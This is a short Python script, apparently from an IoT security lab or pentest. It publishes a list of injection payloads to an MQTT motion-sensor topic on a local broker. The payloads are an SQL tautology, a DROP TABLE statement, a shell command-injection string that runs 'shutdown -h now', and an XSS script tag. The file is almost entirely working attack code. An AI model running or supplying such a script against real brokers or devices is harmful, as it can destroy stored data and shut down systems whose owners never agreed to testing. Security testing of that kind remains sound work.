#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

BROKER = "192.168.1.10"
TOPIC = "iot/sensor/movimiento"

client = mqtt.Client()
client.connect(BROKER, 1883, 60)

payloads = [
    "' OR '1'='1",
    "DROP TABLE sensors;",
    "{}; shutdown -h now",
    "<script>alert(1)</script>"
]

print("→ Iniciando Injection Movimiento MQTT")
for p in payloads:
    client.publish(TOPIC, p)
    print(f"📡 Injection MOV → {p}")
    time.sleep(0.5)
